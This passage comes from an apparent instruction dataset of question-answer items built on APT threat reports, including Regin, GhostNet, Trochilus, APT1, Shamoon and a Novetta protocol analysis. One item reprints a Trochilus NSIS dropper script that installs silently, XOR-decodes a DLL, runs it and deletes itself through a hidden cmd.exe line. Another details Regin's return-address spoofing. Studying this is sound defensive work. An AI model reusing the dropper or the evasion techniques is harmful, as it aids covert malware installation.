HAL.dll\ny Disk.sys\ny Atapi.sys\nThese memory regions are scanned for a specific set of bytes. The sought after combinations are listed below, together with their assembly representation.\ny 0xFF, 0x26: jmp dword ptr [esi]\ny 0xFF, 0x27: jmp dword ptr [edi]\ny 0xFF, 0x66: jmp dword ptr [esi+bb]\ny 0xFF, 0x67: jmp dword ptr [edi+bb]\ny 0xFF, 0xA6: jmp dword ptr [esi+dddddddd]\ny 0xFF, 0xA7: jmp dword ptr [edi+dddddddd]\ny 0xFF, 0xE6: jmp esi\ny 0xFF, 0xE7: jmp edi\nThe assembler representations make the malware's purpose quite clear. The malware will arrange for the system call to return to this particular location inside a trusted module, fooling any external observer who may be monitoring the return address to identify the module originating the call to the external subroutine. Executing the code at this location will make the CPU execute the jump operation, which will eventually lead back to the payload's code.\nIf any of the two bytes sequences presented above is found in the code of a trusted module, and if the surrounding code passes further safety checks, its address is recorded.\nDepending on the specific byte combination found, additional information may be retrieved or calculated; for example, in the case of a jmp dword ptr [edi+xxxxxxxx], the immediate part of the operand is retrieved for calculating the delta between that value and the location containing the address of the post-API-call. The calculated delta value will be assigned to the EDI register so that the execution will flow smoothly.\nImage 7: Trampoline memory allocation\nIf none of these sequences are found, the search continues in other sections and trusted modules. If no suitable location is available, Regin's stage #1 will simply terminate its execution.\nSmall Headline: 2.10.3  Code template customization\nOnce the safe location in a trusted module has been located and its address and type retrieved, Regin's stage #1 can customize the copies of the pre- and post-API-call code templates.\nEach of the values is customized as follows:\ny 0x66116611: delta value to be applied to ESI/EDI register so that the jump instruction at the safe location will lead the execution back to the post-API-call code\ny 0x77117711: address of the safe jump location\ny 0x88118811: nothing, used only as an end marker\ny 0x99119911: not specifically replaced, but parts of it are overwritten with the address of post-API-call code if the safe location involves an indirect jump\nSmall Headline: 2.10.4  trampolines\nTrampolines are the mechanism that Regin's stage #1 uses to reroute the execution through several pieces of code every time the payload executes a call to an external function. There exists a trampoline for each individual imported function, and the trampolines are stored sequentially in memory and accessed as an array.\nEach trampoline is constructed from the following template:\nmov eax, d1d1d1d1 jmp $+d2d2d2d2\nThe values \"d1d1d1d1\" and \"d2d2d2d2\" are placeholders that will be replaced during actual import resolution with the relevant information. In particular, the two values will be replaced with the following information:\ny d1d1d1d1: replaced with the address of the external function from the third party module (for example: NTOSKRNL.EXE!memcpy)\ny d2d2d2d2: replaced with the offset of the pre-API-call code segment, relative to the instruction after the jmp\nDuring import resolution, each item to resolve is fetched and its address retrieved. The address is then used to fill a trampoline as described above. Finally, the address of the trampoline is added to the IAT of the module being mapped in place of the resolved address. Please note that, as is logical, this process is only executed for symbols whose address lies in a section that is flagged as executable. Other symbols are not protected by trampolines and their addresses are added directly to the IAT.\nThe described trampoline mechanism clearly provides transparent protection to the payload.\nMedium Headline: 2.12 relocations\nThe next step of the payload loading process is for the malware to process the possible relocations of the mapped payload.\nTo carry out this operation, the dedicated code needs to process the base relocation table for the payload. Additionally, it makes use of the previously calculated delta between the current image base and the preferred image loading address.\nImage 9: Scanning the payload's DATA_DIRECTORIES\nThe PE loader supports only two specific base relocation types, IMAGE_REL_BASED_HIGHLOW and IMAGE_REL_ BASED_DIR64. However, this level of support is enough to guarantee the loading of binaries produced by recent toolchains.\nAs a matter of fact, the loader's support of the relocation type IMAGE_REL_BASED_DIR64 gives us the firsts hint that a 64-bit version of the Regin framework may exist, in combination with 64-bit additional stages.\nMedium Headline: 2.13 Finalizing the loading process\nAs the final step in the loading process, the malware scans the payload's DATA_DIRECTORIES to perform a final modification to the mapped image.\nThe modification consists of setting the VirtualAddress of the selected DATA_DIRECTORY to the address of the previously mentioned CodeInjection structure. Additionally, the Size field of the selected DATA_DIRECTORY is set to a\nspecial value, 0xFEDCBAFE (renamed MALWARE_MARKER_ DATA_DIR_SIZE in Image 9).\nA suitable DATA_DIRECTORY is one which satisfies the following conditions:\ny The particular data directory is not in use (VirtualAddress and Size must be 0)\ny The directory should not be among the following directories:\n\u25ca EXPORT\n\u25ca IMPORT\n\u25ca IMPORT ADDRESS TABLE (IAT)\n\u25ca DELAY-LOAD IMPORT TABLE\nIt is clear that the malware selects the data directory with special care, specifically to avoid interference with interactions between the mapped payload and its dependencies.\nQ: What are the steps involved in the trampoline transition process used by Regin stage #1? Describe each step in detail.",
    "output": "The trampoline transition process involves several steps: 1. The payload invokes a resolved external subroutine. 2. The trampoline code receives control, retrieves the previously-resolved real address of the external subroutine, and invokes the pre-API call code. 3. The pre-API call code prepares the environment to make the function call return to a trusted location inside a trusted module and invokes the external subroutine. 4. The external subroutine performs its duty and returns. 5. Execution lands in the appropriate part of the trusted module. 6. A jump to the post-API call code is executed. 7. The post-API call code receives control, restores the environment for the payload, and transfers control back to the payload. 8. The payload continues its operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Drewla\nFollowing the discovery of targeted malware on the OHHDL, TGIE and OOT networks, we performed similar analysis on Tibetan NGOs to see if we could identify more infected machines communicating with control servers in China. While we carried out such analysis on a number of NGOs, in this report we focus on Drewla's network.\nThe Drewla ('connection' in Tibetan) is an online outreach project was set up in 2005 that employs Tibetan youth with Chinese language skills to chat with people in mainland China and in the diaspora, raising awareness about the Tibetan situation, sharing the Dalai Lama's teachings, and supplying information on how to circumvent Chinese government censorship on the Internet.\nOn September 12, 2008 Wireshark was used to capture packets from a Drewla computer. An analysis revealed that this computer was compromised by malware which sent communication to, and\nreceived communication from, control servers.\nThe malware made connections to a control server on 221.5.250.98 using the host name www. lookbytheway.net. The IP address 221.5.250.98 is assigned to CNCGROUP-CQ (CNC Group CHINA169 Chongqing Province Network) in China. The malware on the infected computer used HTTP to connect to a file in an attempt to inform the control server of the infected computer's status and download commands. The infected computer used HTTP POST to submit data to CGI scripts hosted on the control server. (see Fig. 6 - p. 29)\nBox 1.\nChinese Internet SIGINT in practice\nDuring the course of our research, we were informed of the following incident. A member of Drewla, a young woman, decided to return to her family village in Tibet after working for two years for Drewla. She was arrested at the Nepalese-Tibetan border and taken to a detention facility, where she was held incommunicado for two months. She was interrogated by Chinese intelligence personnel about her employment in Dharamsala. She denied having been politically active and insisted that she had gone to Dharamsala for studies. In response to this, the intelligence officers pulled out a dossier on her activities and presented her with full transcripts of her Internet chats over the years. They indicated that they were fully aware of, and were monitoring, the Drewla outreach initiative and that her colleagues were not welcome to return to Tibet. They then released her and she returned to her village.\nFig. 6\nThe OHHDL and Drewla were infected by the same malware.\nThis Palantir screen capture shows the relationship between an infected computer at the Office of His Holiness the Dalai Lama (OHHDL) and the Tibetan NGO Drewla. Both attempted to connect to the same control server in the CGI network.\nBig Headline: Phase 2: Identifying command and control servers\nThis phase of the investigation focused on the discovery of the command and control servers. We were able to identify and connect to the control servers used by the GhostNet by analysing the data from the OHHDL obtained during the field investigations carried out in Phase 1. During this process we were able to find and access web-based administration interfaces on the control server identified from the OHHDL data. These servers contain links to other control servers as well as command servers, and so therefore we were able to enumerate additional command and control servers.\nAfter discovering several instances of malware on these servers, we set up a honey pot computer and were able to identify additional malicious servers by monitoring the traffic generated by our infected honey pot. Using the attacker(s)' web-based administration interface, we were able to command our honey pot computer to download gh0st RAT, one of the Trojans used by GhostNet. Eventually, our honey pot computer established a connection to the attacker(s)' gh0st RAT client. The attacker(s) proceeded to execute commands on our honey pot. We were able to discover several IP addresses within a DSL range in Hainan Island (PRC) that the attacker(s) used to communicate with computers infected with gh0st RAT.\nFinally, we were able to map out the methods and capabilities of the GhostNet by a triangulated analysis of three sources: 1) data obtained from our collection of socially engineered emails with backdoor attachments, 2) the captured network traffic from Tibetan targets; and, 3) data obtained by gaining access to the command and control interface. (see Fig. 7 - p. 31)\nWhile analysing the data collected from the infected OHHDL computer (xxxxxxx), we discovered web-based administration interfaces to four control servers. Through some strategic guessing concerning file paths and file names, we were able to access web interfaces to multiple control servers. In total, we found 26 instances of the administration interface across the four servers. It remains unclear why the attacker(s) did not secure access to the control interface. Perhaps the attacker(s) concluded that the file paths and file names could not be easily guessed.\nThe control servers' web interface contains three main components: 1) a listing of all the infected computers that have reported to the control server; 2) an interface to issue commands to the infected computers; and 3) an interface to monitor pending commands to infected computers and their results when completed.\nThe commands issued to the infected computers direct the infected computer to download files from additional command servers under the attacker(s)' control. In some cases, these servers act as control servers themselves; however, some appear to be used exclusively to host malicious files that infected computers are meant to download. The attacker(s) set commands on the control servers that instruct infected computers to download additional remote administration Trojans, such as gh0st RAT, in order to take complete real-time control of the infected computers.\nThree of the four control servers are located in three different locations in China: Hainan, Guangdong and Sichuan. One of the control servers is located at a web-hosting company in the United States. Five of the six command servers are located in mainland China (Hainan, Guangdong, Sichuan and Jiangsu) and one in Hong Kong.\nFig. 7\nThe GhostNet control servers.\nThis Palantir screen capture shows the GhostNet servers we uncovered and their relationship with the malicious email sent to, 1) the International Tibet Support Network, 2) the infected computer at the Office of His Holiness the Dalai Lama; and, 3) the honey pot network set up at the Citizen Lab.\nThe four control servers are:\n\u2022 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, US\n\u2022 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, CHINANET-GD, CN\n\u2022 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx CHINANET-SC, CN\nThe six control/command servers are:\n\u2022 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, CHINANET-HI, CN\n\u2022 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, CUHKNET, HK\n\u2022 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, CHINANET-GD, CN\n\u2022 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, CHINANET-SC, CN\n\u2022 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, CHINANET-JS, CN\n\u2022 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, CHINANET-SC, CN\nThe data obtained from WHOIS records concerning domain name registration reveals that most of the domains are traceable to the same individual. However, the attacker(s) could have simply stolen the domains from someone else, or compromised the servers hosting these domains.\nSmall Headline: List of infected computers (see Fig. 8 - p. 33)\nThe Server List interface provides information on each computer infected by the attacker(s)' malware, indicating the name given to the computer (by its owner/operator), its IP address, when it was first infected, when it last called home (i.e. the control server), and how many times it has called home. Each infected computer is assigned a unique identification number so that the infected computer can be tracked even when its IP address changes. The page also features a link to the Send Command interface, through which the attacker(s) sends instructions to the infected\nSmall Headline: The GhostNet \"Server List\" interface.\nThis screen capture of the GhostNet interface shows all infected computers that have \"checked in\" with the control server. It has been obscured to protect the identity of the victims.\ncomputers. There is also a button at the top of the page that links to a Command Result page that shows the status of the commands sent to the host and their results.\nTo corroborate our findings, there was an entry in the Server List page of the infected OHHDL computer that we analysed during our field investigations outlined in Part One. It contained the unique ID, the IP address, computer name, and a link to issue commands to the infected computer.\n\nBased on the above text, answer a question. Describe the components of the control servers' web interface and how the attackers used these components to manage infected computers.",
    "output": "The control servers' web interface contains three main components: 1) a listing of all the infected computers that have reported to the control server; 2) an interface to issue commands to the infected computers; and 3) an interface to monitor pending commands to infected computers and their results when completed. The commands issued to the infected computers direct them to download files from additional command servers under the attacker's control. Some of these servers act as control servers themselves, while others are used exclusively to host malicious files. The attackers set commands on the control servers that instruct infected computers to download additional remote administration Trojans, such as gh0st RAT, to take complete real-time control of the infected computers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What lessons can cybersecurity experts learn from the ProjectSauron attackers' approach to avoiding patterns and implementing unique indicators of compromise for each target?",
    "output": "The ProjectSauron attackers implemented a unique pattern for each target, ensuring that the same indicators of compromise would have little value for other victims. This strategy makes it harder for defenders to identify and mitigate the threat. Cybersecurity experts can learn from this approach by focusing on developing detection methods that do not rely solely on static indicators. Instead, they should adopt a more holistic and adaptive approach, such as behavioral analysis and machine learning, to identify anomalous activities that may indicate an advanced persistent threat. This shift in mindset is crucial for staying ahead of sophisticated attackers who continually evolve their tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Appendix I: NSIS script used to unpack and process Trochilus RAT samples\n; NSIS script NSIS-3\n; Install\nSetCompressor /SOLID lzma\nSetCompressorDictSize 8\n; --------------------\n; HEADER SIZE: 3976\n; START HEADER SIZE: 300\n; MAX STRING LENGTH: 1024\n; STRING CHARS: 898\nOutFile [NSIS].exe\n!include WinMessages.nsh\nSilentInstall silent\n; -------------------- ; LANG TABLES: 1\n; LANG STRINGS: 38\nName Test\nBrandingText \"Nullsoft Install System v3.0b2\"\n; LANG: 1033\nLangString LSTR_0 1033 \"Nullsoft Install System v3.0b2\"\nLangString LSTR_1 1033 \"$(LSTR_2) Setup\"\nLangString LSTR_2 1033 Test\nLangString LSTR_5 1033 \"Can't write: \"\nLangString LSTR_8 1033 \"Could not find symbol: \"\nLangString LSTR_9 1033 \"Could not load: \"\nLangString LSTR_17 1033 \"Error decompressing data! Corrupted installer?\"\nLangString LSTR_19 1033 \"ExecShell: \"\nLangString LSTR_21 1033 \"Extract: \"\nLangString LSTR_22 1033 \"Extract: error writing to file \"\nLangString LSTR_24 1033 \"No OLE for: \"\nLangString LSTR_25 1033 \"Output folder: \"\nLangString LSTR_29 1033 \"Skipped: \"\nLangString LSTR_30 1033 \"Copy Details To Clipboard\"\nLangString LSTR_36 1033 \"Error opening file for writing: $\\r$\\n$\\r$\\n$0$\\r$\\n$\\r$\\nClick Abort to stop the installation,$\\r$\\nRetry to try again, or$\\r$\\nIgnore to skip this file.\"\nLangString LSTR_37 1033 Custom\nInstType $(LSTR_37) ; Custom\n; wininit = $WINDIR\\wininit.ini\n; --------------------\n; SECTIONS: 1\n; COMMANDS: 56\nSection RC ; Section_0\n; AddSize 362\nSectionIn 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 RO StrCpy $R1 1024\nSystem::Call \"kernel32::ExpandEnvironmentStrings(t $\\\"%ALLUSERSPROFILE%\\WEventsCache$\\\",t .R1,i 1024)\"\n; Call Initialize_____Plugins\n; SetOverwrite off\n; File $PLUGINSDIR\\System.dll\n; SetDetailsPrint lastused\n; Push \"kernel32::ExpandEnvironmentStrings(t $\\\"%ALLUSERSPROFILE%\\WEventsCache$\\\",t .R1,i 1024)\"\n; CallInstDLL $PLUGINSDIR\\System.dll Call\nStrCpy $INSTDIR $R1\nSetOutPath $INSTDIR\nSetOverwrite on\nFile shell.dll\nFile data.dat\nFileOpen $R1 $INSTDIR\\Shell.dll a\nIntOp $1 105 + 0\nIntOp $2 141 + 0\nIntOp $3 0 + 0\nStrCpy $R3 0\nGoto label_17 label_16:\nIntOp $R3 $R3 + 1 label_17:\nIntCmp $R3 4095 0 0 label_29\nIntOp $3 $1 + $2\nIntOp $3 $3 % 255\nFileReadByte $R1 $R2\nFileSeek $R1 -1 CUR\nIntOp $R2 $R2 ^ $3\nFileWriteByte $R1 $R2\nIntOp $1 $2 + 0\nIntOp $2 $3 + 0\nGoto label_16\nGoto label_16\nGoto label_29 label_29:\nFileClose $R1\nSystem::Call \"$INSTDIR\\Shell.dll::Init(i 1)\"\n; Call Initialize_____Plugins\n; SetOverwrite off\n; AllowSkipFiles off\n; File $PLUGINSDIR\\System.dll\n; SetDetailsPrint lastused\n; Push \"$INSTDIR\\Shell.dll::Init(i 1)\"\n; CallInstDLL $PLUGINSDIR\\System.dll Call System::Call \"kernel32::GetModuleFileName(i 0,t .R1,i 1024)\"\n; Call Initialize_____Plugins\n; File $PLUGINSDIR\\System.dll\n; SetDetailsPrint lastused\n; Push \"kernel32::GetModuleFileName(i 0,t .R1,i 1024)\"\n; CallInstDLL $PLUGINSDIR\\System.dll Call\nExecShell open cmd.exe \"/c ping 127.0.0.1&del $\\\"$R1$\\\"\" SW_HIDE ; \"open cmd.exe\"\nSectionEnd\n/*\nFunction Initialize_____Plugins\nSetDetailsPrint none\nStrCmp $PLUGINSDIR \"\" 0 label_52\nPush $0\nSetErrors\nGetTempFileName $0\nDelete $0\nCreateDirectory $0\nIfErrors label_53\nStrCpy $PLUGINSDIR $0\nPop $0 label_52:\nReturn\nlabel_53:\nMessageBox MB_OK|MB_ICONSTOP \"Error! Can't initialize plug-ins directory. Please try again later.\" /SD IDOK Quit\nFunctionEnd\n*/\nNOTE: a\t possibly imperfect\t reconstruction of the NSIS script\t results in artifacts below.\n; --------------------\n; UNREFERENCED STRINGS:\n/*\n1 ProgramFilesDir\n17 CommonFilesDir\n32 \"C:\\Program Files\"\n49 $PROGRAMFILES\n53 \"$PROGRAMFILES\\Common Files\"\n70 $COMMONFILES */\nSeveral interesting elements inside this script\t stand out. In particular, we see \"SilentInstall silent\"\twhich\tlikely makes for an installation of the malware that\t provides no notification to the user. We see that\t threat\t actors have used Nullsoft\t Install System v3.0b2, which was released on August\t 5, 2015 and provides for Windows 10 installation support\t [http://sourceforge.net/p/nsis/news/2015/08/nsis-30b2-released/]. Therefore, we can know that\t at\t least\t this package was designed after August\t 5, 2015. We can see from the config that\t the LZMA compression option is used (SetCompressor /SOLID lzma) which apparently provides for higher compression rates. The /SOLID option compresses all of the installer data\t into one block, resulting in greater compression ratios (and potentially further complicating static analysis and detection routines).\nMedium Headline: About ASERT\nThe Arbor Security Engineering & Response Team (ASERT) at\t Arbor Networks delivers world-class network security research and analysis for the benefit\t of today's enterprise and network operators. ASERT engineers and researchers are part\t of an elite group of institutions that\t are referred to as \"super remediators,\" and represent\t the best\t in information security. This is a\t reflection of having both visibility and remediation capabilities at\t a\t majority of service provider networks globally.\nASERT shares operationally viable intelligence with hundreds of international Computer Emergency Response Teams (CERTs) and with thousands of network operators via\t intelligence briefs and security content\t feeds. ASERT also operates the world1s largest\t distributed honeynet, actively monitoring Internet\t threats around the clock and around the globe via\t ATLAS\u00ae, Arbor's global network of sensors: http://atlas.arbor.net.\tThis\tmission\t and the associated resources that\t Arbor Networks brings to bear to the problem of global Internet\t security is an impetus for innovation and research.\nTo view the latest\t research, news, and trends from Arbor, ASERT and the information security community at\t large, visit\t our Threat\t Portal at http://www.arbornetworks.com/threats/.\nRead the text above and answer this question: What insights can be gained from the specific version of the Nullsoft Install System (NSIS) used in the script? How can this information aid in understanding the timeline and potential targets of the attack?",
    "output": "The specific version of the Nullsoft Install System (NSIS) used in the script is v3.0b2, which was released on August 5, 2015. This information indicates that the malware package was designed after this date, providing a timeline for the attack. Understanding the release date helps cybersecurity experts correlate this attack with other known incidents and campaigns that occurred around the same time. Additionally, knowing that this version supports Windows 10 suggests that the threat actors were targeting modern operating systems, which can guide the focus of defensive measures and incident response strategies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: PLa unit 61398 and state-owned enterprise China telecom are Co-building Computer network operations Infrastructure\nMandiant found an internal China Telecom document online that provides details about the infrastructure provided to Unit 61398. The memo (in (<>)Figure 8) reveals China Telecom executives deciding to \"co-build\" with Unit 61398 to justify the use of their own inventory in the construction of fiber optic communication lines \"based on the principle that national defense construction is important.\" The letter also appears to indicate that this is a special consideration being made outside of China Telecom's \"normal renting method\" for Unit 61398. Additionally, the memo clarifies the phrase \"Unit 61398\" with the comment \"(GSD 3rd Department, 2nd Bureau).\" The memo not only supports the identity of Unit 61398 as GSD's 3rd Department 2nd Bureau, but also reveals the relationship between a \"very important communication and control department\" (Unit 61398) and a state-influenced enterprise.\n22 Confirmation of several other Unit 61398 support facilities along Datong Road: Address: \u4e0a\u6d77\u5e02\u6d66\u4e1c\u65b0\u533a\u5927\u540c\u8def50\u53f7 (Pudong New Area, Shanghai, Datong Road 50) Building Name: \u4e2d\u56fd\u4eba\u6c11\u89e3\u653e\u519b\u7b2c61398\u90e8\u961f\u53f8\u4ee4\u90e8 (People's Liberation Army Unit 61398 Headquarters) Source: Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6 %B0%91%E8%A7%A3%E6%94%BE%E5%86%9B% E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%BB%A4%E9%83%A8, accessed February 6, 2013. Address: \u4e0a\u6d77\u5e02\u6d66\u4e1c\u65b0\u533a\u5927\u540c\u8def118\u5f04\u7532 (Pudong New Area, Shanghai, Datong Road 118 A) Building Name: \u4e2d\u56fd\u4eba\u6c11\u89e3\u653e\u519b\u7b2c61398\u90e8\u961f\u53f8\u4ee4\u90e8 (People's Liberation Army Unit 61398 Headquarters) Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0% 91%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%BB%A4%E9%83%A8_0, accessed February 6, 2013. Address: \u4e0a\u6d77\u5e02\u6d66\u4e1c\u65b0\u533a\u9ad8\u6865\u9547\u5927\u540c\u8def135\u53f7 (Pudong New Area, Shanghai Gaoqiao Town, Datong Road 135) Building Name: \u4e2d\u56fd\u4eba\u6c11\u89e3\u653e\u519b\u7b2c61398\u90e8\u961f (People's Liberation Army Unit 61398) Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9 1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F_0, accessed February 6, 2013. Address: \u4e0a\u6d77\u5e02\u6d66\u4e1c\u65b0\u533a\u9ad8\u6865\u9547\u5927\u540c\u8def153\u53f7 (Pudong New Area, Shanghai Gaoqiao Town, Datong Road 153) Building Name: \u4e2d\u56fd\u4eba\u6c11\u89e3\u653e\u519b\u7b2c61398\u90e8\u961f (People's Liberation Army Unit 61398) Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9 1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F, accessed February 6, 2013. Address: \u4e0a\u6d77\u5e02\u6d66\u4e1c\u65b0\u533a\u5927\u540c\u8def305\u53f7 (Pudong New Area, Shanghai, Datong Road 305) Building Name: \u4e2d\u56fd\u4eba\u6c11\u89e3\u653e\u519b\u7b2c61398\u90e8\u961f\u540e\u52e4\u90e8 (Logistics Department of the Chinese People's Liberation Army Unit 61,398)( Chinese phone book listing building name and address; http://114.mingluji.com/category/%E7%B1%BB%E5%9E%8B/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%91%E8%A7%A3%E6%94%BE%E5%86%9B?page=69, accessed February 6, 2013.\n23 Unit 61398 Kindergarden Listed in Shanghai Pudong: http://www.pudong-edu.sh.cn/Web/PD/jyzc_school.aspx?SiteID=45&UnitID=2388\n24 James C. Mulvenon and Andrew N. D. Yang, editors, The People's Liberation Army as Organization: Reference Volume v1.0, (Santa Monica, CA: RAND Corporation, 2002), 125, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed February 6, 2013.\nFIGure 8: China telecom Memo discussing unit 61398 source:  http://r9.he3.com.cn/%e8%a7%84%e5%88%92/%e9%81%93%e8%B7%aF%e5%8F%8a%e5%85%B6%e 4%BB%96%e8%a7%84%e5%88%92%e5%9B%Be%e7%Ba%B8/%e4%BF%a1%e6%81%aF%e5%9B%a D%e5%8C%Ba/%e5%85%B3%e4%Ba%8e%e6%80%BB%e5%8F%82%e4%B8%89%e9%83%a8%e4%B a%8C%e5%B1%80-%e4%B8%8a%e6%B5%B7005%e4%B8%aD%e5%BF%83%e9%9C%80%e4%BD%B-F%e7%94%a8%e6%88%91%e5%85%aC%e5%8F%B8%e9%80%9a%e4%BF%a1.pdf25\n25 This link has Chinese characters in it which are represented in URL encoding\nMarket Department Examining Control Affairs Division Report\nRequesting Concurrence Concerning the General Staff Department 3rd Department 2nd Bureau Request to Use Our Company's Communication Channel\nDivision Leader Wu:\nThe Chinese People's Liberation Army Unit 61398 (General Staff Department 3rd Department 2nd Bureau) wrote to us a few days ago saying that, in accordance with their central command \"8508\" on war strategy construction [or infrastructure] need, the General Staff Department 3rd Department 2nd Bureau (Gaoqiao Base) needs to communicate with Shanghai City 005 Center (Shanghai Intercommunication Network Control Center within East Gate Bureau) regarding intercommunication affairs. This bureau already placed fiber-optic cable at the East Gate front entrance [road pole]. They need to use two ports to enter our company's East Gate communication channel. The length is about 30m. At the same time, the second stage construction (in Gaoqiao Base) needs to enter into our company's Shanghai Nanhui Communication Park 005 Center (special-use bureau). This military fiber-optic cable has already been placed at the Shanghai Nanhui Communication Park entrance. They need to use 4 of our company ports inside the Nanhui Communication Park to enter. The length is 600m. Upon our division's negotiation with the 3rd Department 2nd Bureau's communication branch, the military has promised to pay at most 40,000 Yuan for each port. They also hope Shanghai Telecom will smoothly accomplish this task for the military based on the principle that national defense construction is important. After checking the above areas' channels, our company has a relatively abundant inventory to satisfy the military's request.\nThis is our suggestion: because this is concerning defense construction, and also the 3rd Department 2nd Bureau is a very important communication control department, we agree to provide the requested channels according to the military's suggested price. Because this is a one-time payment, and it is difficult to use the normal renting method, we suggest our company accept one-time payment using the reason of \"Military Co-Construction [with China Telecom] of Communication Channels\" and provide from our inventory. The military's co-building does not interfere with our proprietary rights. If something breaks, the military is responsible to repair it and pay for the expenses. After you agree with our suggestion, we will sign an agreement with the communication branch of 61398 and implement it.\nPlease provide a statement about whether the above suggestion is appropriate or not.\n[Handwritten Note]Agree with the Market Department Examining Control Affairs Division suggestion; inside the agreement clearly [...define? (illegible) ...] both party's responsibilities.\nFIGure 9: english translation of China telecom Memo\n\nQ: In what ways does the memo reveal the relationship between a state-influenced enterprise like China Telecom and a military unit like PLA Unit 61398, and what implications does this have for understanding the broader cyber espionage activities of APT1?",
    "output": "A: The memo reveals a close relationship between China Telecom, a state-influenced enterprise, and PLA Unit 61398, a military unit. This relationship involves the provision of critical infrastructure, such as fiber optic communication lines, to support the military's needs. The memo shows that China Telecom made special considerations for Unit 61398, indicating a prioritization of national defense over standard business practices. This collaboration suggests that state-influenced enterprises may play a significant role in supporting the cyber espionage activities of units like APT1, providing the necessary infrastructure and resources to conduct extensive and persistent cyber operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The Full Shamoon: How the Devastating Malware Was Inserted Into Networks\n2/15/2017\nAuthored by the IBM X-Force Incident Response and Intelligence Services (IRIS) team.\nThrough their recent investigations, our forensics analysts pinpointed the initial compromise vector and post-compromise operations that led to the deployment of the destructive Shamoon malware on targeted infrastructures. It's worth mentioning that, according to X-Force IRIS, the initial compromise took place weeks before the actual Shamoon deployment and activation were launched.\n\nBased on the above text, answer a question. How did the IBM X-Force Incident Response and Intelligence Services (IRIS) team determine the timeline of the initial compromise leading up to the deployment of the Shamoon malware? What insights does this provide into the tactics used by the attackers?",
    "output": "The IBM X-Force Incident Response and Intelligence Services (IRIS) team determined the timeline of the initial compromise through their forensic investigations. They found that the initial compromise occurred weeks before the actual deployment and activation of the Shamoon malware. This insight highlights the strategic planning and patience employed by the attackers, who likely used this period to gain deeper access, escalate privileges, and prepare the environment for the destructive payload. Understanding this delay helps cybersecurity experts recognize the importance of continuous monitoring and early detection mechanisms to identify and mitigate potential threats before they cause significant damage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Figure 3: VictimInfoPacket Structure Definition\nCommunication between the client and the server variant exists in the form of a sequence of encrypted datagrams. Each datagram consists of a 24 byte header followed by an optional payload section. The header is not encrypted but if the optional payload is attached, the payload is encrypted using a DWORD XOR. The format of the header is as follows:\nstruct PacketHeader\n{\n};\nThe dwTotalPacketSize field defines the total size of the datagram including both the size of the header and the size of the optional payload. The dwPktType field correlates to the module ID which allows the server variant to route the datagram to the appropriate module without further inspection of the payload data. The dwChecksum value is sum of all of the bytes within the optional header (the field is ignored, but present, if there is no payload section). The dwEncryptionKey is the 32-bit XOR encryption key for the payload section. If the fCompressedPayload field is non-zero, then the data within the payload is compressed using LZO compression (prior to XOR encoding) and the dwDecompressedSize field represents the final size of the payload data after decompression. The payload section can have up to three different presentations depending on if compression is used. The first presentation is the original payload data as generated by the client or server, the second presentation is the LZO compressed form, and the final presentation (the presentation that exists going across the network) is the 32-bit XOR encoded data blob. Figure 4 provides a graphical representation of the presentation types of the payload section.\nAfter sending the server information via the VictimInfoPacket, the server variant spins off a CommLoop thread for the connection and returns to waiting for new connections from clients to appear.\nThe CommLoop thread begins by establishing the set of internal command handlers available to the server variant. With the exception of the administrative command handler (which is built into the CommLoop), each of the internal commands consists of an object derived from a base object PCC_BASEMOD.\nclass PCC_BASEMOD\n{\n~PCC_BASEMOD(); // destructor\n// virtual member functions void *return1(); // always returns 1 void Cleanup(void); void ProcessPacket(void *pkt, DWORD dwPktSize); int ReadWaitingData(void **pPacket, DWORD *dwPktSize); int MallocWithClear(size_t Size); int Free(void *Memory);\n// member variables DWORD dwPacketIdentifierCode;\n};\nFigure 5: PCC_BASEMOD Pseudo-C++ Declaration\nThe server variant appears to have a modular design allowing an attacker to compile only the components that are necessary for any given operation. The malware supports up to 8 different modules per sample with each module designating its own ID code. Novetta has observed the following modules:\nGiven the spacing in ID numbers (as noted in the gap between 0x82 and 0x84 in an otherwise sequential ID scheme), it is conceivable that additional modules exist.\nAfter establishing the tools, an infinite loop (CommLoop) is entered in which the server variant will wait for up to 1/100 of a second for input from the network; if such input arrives, the server routes the packet to the appropriate handler. If the network input does not arrive, the CommLoop queries each of the command handlers for any packets they may have queued (by calling each command handler's ReadWaitingData function) and transmits the packets the handlers have generated. Additionally, if more than 60 seconds passes between network inputs from the client or network outputs from the server variant, the CommLoop will send out a beacon packet (dwPktType = 